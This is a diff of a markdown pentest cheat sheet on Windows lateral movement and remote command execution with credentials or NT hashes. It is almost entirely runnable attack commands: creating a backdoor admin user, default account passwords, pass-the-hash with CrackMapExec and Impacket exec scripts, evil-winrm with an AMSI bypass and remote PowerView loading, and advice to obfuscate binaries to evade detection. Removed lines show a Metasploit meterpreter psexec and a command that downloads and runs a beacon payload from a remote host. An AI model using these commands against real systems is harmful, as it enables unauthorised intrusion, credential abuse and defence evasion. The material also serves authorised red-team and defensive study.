@@ -2,30 +2,34 @@
 
 ## Summary
 
-* [TIPS](#tips)
-    * [TIP 1 - Create your credential](#tip-1-create-your-credential)
-    * [TIP 2 - Retail Credential](#tip-2-retail-credential)
-    * [TIP 3 - Sandbox Credential - WDAGUtilityAccount](#tip-3-sandbox-credrential-wdagutilityaccount)
-* [Metasploit](#metasploit)
-    * [Metasploit - SMB](#metasploit---smb)
-    * [Metasploit - Psexec](#metasploit---psexec)
-* [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)
-* [WinRM](#winrm)
-* [Powershell Remoting](#powershell-remoting)
+* [Get credentials](#get-credentials)
+    * [Create your credential](#create-your-credential)
+    * [Guest Credential](#guest-credential)
+    * [Retail Credential](#retail-credential)
+    * [Sandbox Credential](#sandbox-credential)
 * [Crackmapexec](#crackmapexec)
-* [Winexe](#winexe)
-* [WMI](#wmi)
-* [Psexec.py / Smbexec.py / Wmiexec.py](#psexecpy--smbexecpy--wmiexecpy)
-* [PsExec - Sysinternal](#psexec-sysinternal)
+* [Impacket](#impacket)
+    * [PSExec](#psexec)
+    * [WMIExec](#wmiexec)
+    * [SMBExec](#smbexec)
+
 * [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
-* [Netuse](#netuse)
-* [Runas](#runas)
-* [Pass the Ticket](#pass-the-ticket)
-* [SSH](#ssh)
+* [Powershell Remoting Protocol](#powershell-remoting-protocol)
+    * [Powershell Credentials](#powershell-credentials)
+    * [Powershell PSSESSION](#powershell-pssession)
+    * [Powershell Secure String](#powershell-secure-strings)
+* [SSH Protocol](#ssh-protocol)
+* [WinRM Protocol](#winrm-protocol)
+* [WMI Protocol](#wmi-protocol)
 
-## TIPS
+* [Other methods](#other-methods)
+    * [PsExec - Sysinternal](#psexec-sysinternal)
+    * [Mount a remote share](#mount-a-remote-share)
+    * [Run as another user](#run-as-another-user)
 
-### TIP 1 - Create your credential
+## Get credentials
+
+### Create your credential
 
 ```powershell
 net user hacker Hcker_12345678* /add /Y
@@ -57,7 +61,17 @@ net user /dom
 net user /domain
 ```
 
-### TIP 2 - Retail Credential 
+### Guest Credential
+
+By default every Windows machine comes with a Guest account, its default password is empty.
+
+```powershell
+Username: Guest
+Password: [EMPTY]
+NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
+```
+
+### Retail Credential 
 
 Retail Credential [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)
 
@@ -68,7 +82,7 @@ Username: RetailAdmin
 Password: trs10
 ```
 
-### TIP 3 - Sandbox Credential - WDAGUtilityAccount
+### Sandbox Credential
 
 WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)
 
@@ -80,179 +94,128 @@ Username: wdagutilityaccount
 Password: pw123
 ```
 
-
-## Metasploit
-
-### Metasploit - SMB
-
-```c
-use auxiliary/scanner/smb/smb_login  
-set SMBDomain DOMAIN  
-set SMBUser username
-set SMBPass password
-services -p 445 -R  
-run
-creds
-```
-
-### Metasploit - Psexec
-
-Note: the password can be replaced by a hash to execute a `pass the hash` attack.
-
-```c
-use exploit/windows/smb/psexec
-set RHOST 10.2.0.3
-set SMBUser username
-set SMBPass password
-set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-set PAYLOAD windows/meterpreter/bind_tcp
-run
-shell
-```
-
 ## Crackmapexec
 
-```powershell
-root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -x 'whoami' # cmd
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -X 'whoami' # powershell
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method atexec -x 'whoami'
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method wmiexec -x 'whoami'
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -x 'whoami'
-```
+Using [Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
 
-## Remote Code Execution with PS Credentials
-
-```powershell
-PS C:\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force
-PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USERNAME', $SecPassword)
-PS C:\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami}
-PS C:\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami}
-PS C:\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\Temp\beacon.exe'; Start-Process -wait C:\Temp\beacon.exe}
-```
-
-## WinRM
-
-Require:
-* Port **5985** or **5986** open.
-* Default endpoint is **/wsman**
-
-```powershell
-root@payload$ git clone https://github.com/Hackplayers/evil-winrm
-root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
-root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
-root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
-root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local
-
-*Evil-WinRM* PS > Bypass-4MSI
-*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
-```
-
-or using a custom ruby code to interact with the WinRM service.
-
-```ruby
-require 'winrm'
-
-conn = WinRM::Connection.new( 
-  endpoint: 'http://ip:5985/wsman',
-  user: 'domain/user',
-  password: 'password',
-)
-
-command=""
-conn.shell(:powershell) do |shell|
-    until command == "exit\n" do
-        print "PS > "
-        command = gets        
-        output = shell.run(command) do |stdout, stderr|
-            STDOUT.print stdout
-            STDERR.print stderr
-        end
-    end    
-    puts "Exiting with code #{output.exitcode}"
-end
-```
+* CrackMapExec supports many protocols
+    ```powershell
+    crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
+    crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
+    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
+    ```
+* CrackMapExec works with password, NT hash and Kerberos authentication
+    ```powershell
+    crackmapexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password
+    crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash
+    export KRB5CCNAME=/tmp/kerberos/admin.ccache; crackmapexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
+    ```
 
 
-## Powershell Remoting
+## Impacket
 
-> PSSESSION
-
-```powershell
-PS> Enable-PSRemoting
-
-# use credential
-PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
-PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
-PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
-
-# one-to-one interactive session
-PS> Enter-PSSession -computerName DC01
-[DC01]: PS>
-
-# one-to-one execute scripts and commands
-PS> $Session = New-PSSession -ComputerName CLIENT1
-PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
-PS> Invoke-Command -Session $Session -scriptBlock { $test }
-1
-
-# one-to-many execute scripts and commands
-PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
-PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
-```
-
-
-## Winexe 
-
-Integrated to Kali
-
-```powershell
-root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
-```
-
-## WMI
-
-```powershell
-PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
-```
-
-## Psexec.py / Smbexec.py / Wmiexec.py 
-
-From [Impacket](https://github.com/SecureAuthCorp/impacket) (:warning: renamed to impacket-xxx in Kali)
+From [fortra/impacket](https://github.com/fortra/impacket) (:warning: renamed to impacket-xxxxx in Kali)    
 :warning: `get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.    
-:warning: French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.
+:warning: French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.   
+:warning: By default, Impacket's scripts are stored in the examples folder: `impacket/examples/psexec.py`. 
 
-```powershell
-root@payload$ git clone https://github.com/CoreSecurity/impacket.git
+All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports. 
+The following table summarize the port used by each scripts.
 
-# PSEXEC like functionality example using RemComSv
-root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10
-# this will drop a binary on the disk = noisy
+| Method      | Port Used                             | Admin Required |
+|-------------|---------------------------------------|----------------|
+| psexec.py   | tcp/445                               | Yes            |
+| smbexec.py  | tcp/445                               | No             |
+| atexec.py   | tcp/445                               | No             |
+| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    | No             |
+| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | Yes            |
 
-# A similar approach to PSEXEC w/o using RemComSvc
-root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10
+* `psexec`: equivalent of Windows PSEXEC using RemComSvc binary.
+    ```ps1
+    psexec.py DOMAIN/username:password@10.10.10.10
+    ```
+* `smbexec`: a similar approach to PSEXEC w/o using RemComSvc
+    ```ps1
+    smbexec.py DOMAIN/username:password@10.10.10.10
+    ```
+* `atexec`: executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
+    ```ps1
+    atexec.py DOMAIN/username:password@10.10.10.10
+    ```
+* `dcomexec`: a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints
+    ```ps1
+    dcomexec.py DOMAIN/username:password@10.10.10.10
+    ```
+* `wmiexec`: a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port such as tcp/50911.
+    ```ps1
+    wmiexec.py DOMAIN/username:password@10.10.10.10
+    wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    ```
 
-# A semi-interactive shell, used through Windows Management Instrumentation. 
-root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10
-root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
+To allow Non-RID 500 local admin accounts performing Wmi or PsExec, execute: 
+`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1`
+To prevent RID 500 from being able to WmiExec or PsExec, execute:
+`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /f /d 1`
 
-# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
-root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10
 
-# Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
-root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10
+### PSExec
+
+Instead of uploading `psexeccsv` service binary, it uploads to `ADMIN$` a service binary with an arbitrary name.
+PSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections ([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb))
+
+Use a custom binary and service name with : `psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe`    
+
+Also a custom file can be specified with the parameter : `-file /tmp/RemComSvcCustom.exe`.    
+You need to update the pipe name to match "Custom_communication" in the line 163     
+
+```py
+162    tid = s.connectTree('IPC$')
+163    fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
 ```
 
-## PsExec - Sysinternal
+Alternatively you can use the fork [ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files).
 
-from Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
 
-```powershell
-PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe
+### WMIExec
 
-# switch admin user to NT Authority/System
-PS C:\> PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s 
+Use a non default share `-share SHARE` to write the output to reduce the detection.   
+By default this command is executed : `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1`
+
+
+### SMBExec
+
+It creates a service with the name `BTOBTO` ([smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)) and transfers commands from the attacker in a bat file in `%TEMP/execute.bat` ([smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56)).
+
+```py
+OUTPUT_FILENAME = '__output'
+BATCH_FILENAME  = 'execute.bat'
+SMBSERVER_DIR   = '__tmp'
+DUMMY_SHARE     = 'TMP'
+SERVICE_NAME    = 'BTOBTO'
 ```
+
+It will create a new service every time we execute a command. It will also generate an Event 7045.
+
+By default this command is executed: `%COMSPEC% /Q /c echo dir > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`, where `%COMSPEC%` points to `C:\WINDOWS\system32\cmd.exe`.
+
+```py
+class RemoteShell(cmd.Cmd):
+    def __init__(self, share, rpc, mode, serviceName, shell_type):
+        cmd.Cmd.__init__(self)
+        self.__share = share
+        self.__mode = mode
+        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
+        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
+        self.__outputBuffer = b''
+        self.__command = ''
+        self.__shell = '%COMSPEC% /Q /c '
+        self.__shell_type = shell_type
+        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
+        self.__serviceName = serviceName
+```
+
 
 ## RDP Remote Desktop Protocol 
 
@@ -301,32 +264,85 @@ Abuse RDP protocol to execute commands remotely with the following commands;
     ```
 
 
-## Netuse 
+## Powershell Remoting Protocol
 
-Windows only
+### Powershell Credentials
 
-```powershell
-PS C:\> net use \\ordws01.cscou.lab /user:DOMAIN\username password C$
+```ps1
+PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
+PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
 ```
 
-## Runas 
+### Powershell PSSESSION
 
-```powershell
-PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
-PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
+* Enable PSRemoting on the host
+    ```ps1
+    Enable-PSRemoting -Force
+    net start winrm  
+
+    # Add the machine to the trusted hosts
+    Set-Item wsman:\localhost\client\trustedhosts *
+    Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10"
+    ```
+
+* Execute a single command
+    ```powershell
+    PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
+    PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
+    PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
+    ```
+
+* Interact with a PS Session
+    ```powershell
+    PS> Enter-PSSession -computerName DC01
+    [DC01]: PS>
+
+    # one-to-one execute scripts and commands
+    PS> $Session = New-PSSession -ComputerName CLIENT1
+    PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
+    PS> Invoke-Command -Session $Session -scriptBlock { $test }
+    1
+    ```
+
+
+### Powershell Secure String
+
+```ps1
+$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
+$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
+$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
+$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
+$decrypted
 ```
 
-## Pass the Ticket
 
+## WinRM Protocol
+
+**Requirements**:
+* Port **5985** or **5986** open.
+* Default endpoint is **/wsman**
+
+If WinRM is disabled on the system you can enable it using: `winrm quickconfig`
+
+The easiest way to interact over WinRM on Linux is with [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 ```powershell
-python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user
-[*] Saving ticket in user.ccache
-cp user.ccache /tmp/krb5cc_0
-export KRB5CCNAME=/tmp/krb5cc_0
-klist
+evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
+evil-winrm -i 10.0.0.20 -u username -H HASH
+evil-winrm -i 10.0.0.20 -u username -p password -r domain.local
+
+*Evil-WinRM* PS > Bypass-4MSI
+*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
 ```
 
-## SSH
+
+## WMI Protocol
+
+```powershell
+PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
+```
+
+
+## SSH Protocol
 
 :warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!)
 
@@ -335,8 +351,44 @@ cp user.ccache /tmp/krb5cc_1045
 ssh -o GSSAPIAuthentication=yes user@domain.local -vv
 ```
 
+
+## Other methods
+
+### PsExec - Sysinternal
+
+From Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
+
+```powershell
+PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe
+
+# switch admin user to NT Authority/System
+PS C:\> PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
+```
+
+### Mount a remote share 
+
+```powershell
+PS C:\> net use \\srv01.domain.local /user:DOMAIN\username password C$
+```
+
+### Runas as another user 
+
+Runas is a command-line tool that is built into Windows Vista.
+Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
+
+```powershell
+PS C:\> runas /netonly /user:DOMAIN\username "cmd.exe"
+PS C:\> runas /noprofil /netonly /user:DOMAIN\username cmd.exe
+```
+
 ## References
 
 - [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
 - [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 - [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
+- [Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
+- [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
+- [SMB protocol cheatsheet - aas-s3curity](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/lateral-movement/smb-protocol)
+- [Windows Lateral Movement with smb, psexec and alternatives - nv2lt](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)
+- [PsExec.exe IOCs and Detection - Threatexpress](https://threatexpress.com/redteaming/tool_ioc/psexec/)
+- [A Dive on SMBEXEC - dmcxblue - 8th Feb 2021](https://0x00sec.org/t/a-dive-on-smbexec/24961)
